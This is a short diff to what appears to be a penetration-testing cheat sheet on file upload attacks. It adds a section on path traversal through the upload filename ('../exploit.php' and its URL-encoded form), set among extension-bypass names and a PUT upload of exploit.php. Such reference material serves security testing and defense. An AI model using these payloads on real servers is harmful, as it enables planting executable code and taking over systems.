@@ -164,6 +164,8 @@ Content-Type: application/x-httpd-php
 .php%00.png
 .p.phphp
 ```
+### Uploading files via path traversal vulnerability
+In some cases you can exploit file upload vulnerability via path traversal. ```filename="../exploit.php"``` or url encoding ```filename="..%2fexploit.php```.
 ### Uploading files using PUT
 ```txt
 PUT /images/exploit.php HTTP/1.1
